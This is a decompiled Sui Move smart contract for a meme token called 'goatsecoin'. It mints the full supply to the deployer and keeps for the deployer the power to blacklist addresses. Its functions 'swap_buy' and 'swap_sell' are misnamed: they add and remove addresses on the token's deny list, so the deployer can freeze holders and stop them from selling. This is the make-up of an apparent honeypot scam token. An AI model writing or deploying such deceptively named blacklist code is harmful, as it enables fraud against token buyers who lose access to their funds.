module 0x4f88d37106836428ba3c53c1d457f62f9475575cb704585b53deb8979c1697e2::goatsecoin {
    struct GOATSECOIN has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GOATSECOIN, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GOATSECOIN>(arg0, 9, b"goatsecoin", b"goatsecoin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYpAPZ6yGFRSfkj3FBajJbsf3y4jr3VNqKVf3De7YWvMi"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GOATSECOIN>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GOATSECOIN>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GOATSECOIN>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GOATSECOIN>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOATSECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GOATSECOIN>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOATSECOIN>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GOATSECOIN>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

